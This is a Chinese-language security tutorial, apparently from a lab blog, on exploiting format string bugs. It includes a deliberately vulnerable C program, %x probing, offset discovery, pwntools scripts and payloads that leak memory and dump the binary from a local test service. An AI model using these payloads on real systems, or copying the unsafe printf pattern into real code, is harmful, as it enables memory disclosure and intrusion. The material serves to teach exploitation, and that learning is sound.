Author: **[Hcamael](http://0x48.pw/2017/01/06/0x2c/) (知道创宇404安全实验室)** Date:
2017-03-14
格式化字符串漏洞现在网上有很多相关的文章，原理啥的随便搜搜都是，这篇文章就对格式化字符串漏洞如何利用进行研究。
格式化字符串危害最大的就两点，一点是leak memory，一点就是可以在内存中写入数据，简单来说就是格式化字符串可以进行内存地址的读写。
## Leak Memory
先来对一个简单的Demo进行研究:
    // fmt_test.c
    int main(int argc, char * argv[])
    {
        char a[1024];
        memset(a, '\0', 1024);
        read(0, a, 1024);
        printf(a);
        return 0;
    }
    // $ gcc fmt_test.c -o fmt_test -m32
    // $ socat TCP4-LISTEN:10001,fork EXEC:./fmt_test
假设我们不知道该程序的源码，连bin都没有，只是能访问一个这样的应用:
    $ nc 127.0.0.1 10001                       
    aaaaaaa
    aaaaaaa
在这种情况下，就是去尝试各种漏洞的攻击方法，比如栈溢出漏洞就输入一堆字符，比如`100*"a"`，而格式化字符串漏洞是使用"%x"这类格式化字符串去尝试，比如:
    $ nc 127.0.0.1 10001
    %x
    2c51cce0
得到了这样的返回就说明该应用存在格式化字符串漏洞了，因为没有源代码或bin，并不知道要往哪写啥数据，所以我们可以先leak memory，获取该应用的源码
leak memory利用到的是`%s`格式化字符，它的作用是输出对应参数指向地址的值，也就是说它对应的参数是一个指针，而我们可以得到该指针对应内存数据
我们还可以继续改进该格式化字符，`%2$s`，它表示的意义是输出第二个参数指向的内存的值
那么我们怎么通过上面的格式化字符获取我们想要的内存的地址呢？这就涉及第三个知识点。
格式化字符串漏洞是怎么产生的？首先要有一个函数，比如`read`,
比如`gets`获取用户输入的数据储存到局部变量中，然后直接把该变量作为`printf`这类函数的第一个参数值
其中局部变量是储存在栈中，而且是储存在栈的高位地址上，这里具体细节可以去读读汇编代码，简单的说，进入到一个函数中后，会`sub
rsp,xxx`一段局部变量的栈空间，然后函数的参数啥的都是push到局部变量的栈空间之上
理解了上述的知识点后，我们可以输入想leak数据的内存地址，然后爆破出我们输入数据的位置，不就能leak相应地址的内存的数据了么
比如我输入`ABCD%2$x`，如果输出`ABCD`十六进制值，则说明第二个参数为我们输入的数据的起始位置.
    $ nc 127.0.0.1 10001
    ABCD%2$x    
    ABCD400
    $ nc 127.0.0.1 10001
    ABCD%3$x
    ABCD174
    $ nc 127.0.0.1 10001
    ABCD%4$x
    ABCD174
    ....
    $ nc 127.0.0.1 10001
    ABCD%11$x
    ABCD44434241
这样我们就能得到payload: `addr + %11$s`, 返回值为`addr`指向的内存的字符串，直到`\0`为止
这里我们可以进行测试下(我们现在是处于研究状态，虽然假想没bin，但实际我们是有的，所以可以进行测试来证明我们的结论)
    $ objdum -d fmt_test -M intel
    ....
    080485c4 :
     80485c4:   53                      push   ebx
     80485c5:   83 ec 08                sub    esp,0x8
     80485c8:   e8 33 fe ff ff          call   8048400 
     80485cd:   81 c3 33 1a 00 00       add    ebx,0x1a33
     80485d3:   83 c4 08                add    esp,0x8
     80485d6:   5b                      pop    ebx
     80485d7:   c3                      ret    
    $ py                          
    >>> from pwn import *
    >>> p = remote("127.0.0.1",10001)
    [x] Opening connection to 127.0.0.1 on port 10001
    [x] Opening connection to 127.0.0.1 on port 10001: Trying 127.0.0.1
    [+] Opening connection to 127.0.0.1 on port 10001: Done
    >>> p.send(p32(0x80485c4)+"%11$s")
    >>> p.recv()
    '\xc4\x85\x04\x08S\x83\xec\x08\xe83\xfe\xff\xff\x81\xc33\x1a'
    >>> 
从上面的测试代码中可以证明上述所讲的结论, 我们成功leak出相应内存的数据(直到`\x00`为止)
上面爆破出来的11我们称为offset，pwntools有自动化代码可以算出offset:
    # fmt_test.py
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    def exec_fmt(payload):
        p = process("a.out")
        p.sendline(payload)
        info = p.recv()
        p.close()
        return info
    autofmt = FmtStr(exec_fmt)
    print autofmt.offset
我们可以看看其中一条DEBUG数据和结果:
    $ python fmt_test.py
    ...
    [+] Starting local process './a.out' argv=['a.out'] : Done
    [DEBUG] Sent 0x22 bytes:
        'aaaabaaacaaadaaaeaaaSTART%11$pEND\n'
    [DEBUG] Received 0x27 bytes:
        'aaaabaaacaaadaaaeaaaSTART0x61616161END\n'
    [*] Stopped program './a.out'
    [*] Found format string offset: 11
    11
测试完了，现在又恢复到没bin状态，有了前面的基础，要dump出整个bin就很容易了
在Linux下，不开PIE保护时，32位的ELF的默认首地址为`0x8048000`，如果开启了PIE保护，则需要根据ELF的魔术头`7f 45 4c
46`进行爆破，内存地址一页一页的往前翻直到翻到ELF的魔术头为止
但是这时候还存在一个问题: 比如我的Payload为:
    p = remote("127.0.0.1",10001)
    p.send(p32(0x8048000)+"%11$s")
    print p.recv()
得到的结果是
    $ python fmt_test.py
    ...
    Traceback (most recent call last):
      ...
    EOFError
    ...
发生了EOFError, 这是因为
    >>> p32(0x8048000)
    '\x00\x80\x04\x08'
`printf` 根据`\x00`判断结尾
所以我们需要更改下payload
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    
    from pwn import *
    context.log_level = 'debug'
    p = remote("127.0.0.1",10001)
    p.send("%13$saaa" + p32(0x8048000))
    print p.recv()
可以成功dump数据了: